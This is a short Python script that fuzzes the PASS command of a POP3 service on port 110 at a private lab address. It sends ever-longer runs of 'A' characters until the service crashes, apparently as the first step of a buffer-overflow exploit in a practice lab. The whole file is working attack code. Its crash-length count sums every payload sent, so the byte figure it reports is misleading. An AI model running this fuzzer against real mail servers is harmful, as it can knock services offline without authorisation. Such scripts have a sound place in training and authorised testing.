#!/usr/bin/env python

from time import sleep
import socket, sys

ip = "10.10.151.194"
port = 110
buff = ["A"]
max_buffer = 30
counter = 100
increment = 200
crash_len = 0

while len(buff) <= max_buffer:
	buff.append("A" * counter)
	counter = counter + increment


try:
	for string in buff:
		print(f"Fuzzing PASS with {len(string)} bytes.")
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))
		s.recv(1024)
		s.send(bytes("USER test\r\n", "latin-1"))
		s.recv(1024)
		s.send(bytes("PASS" + string + "\r\n", "latin-1"))
		s.send(bytes("QUIT\r\n", "latin-1"))
		crash_len += len(string)
	s.close()
except:
	print(f"Application crashed at {crash_len} bytes!")
	sys.exit()
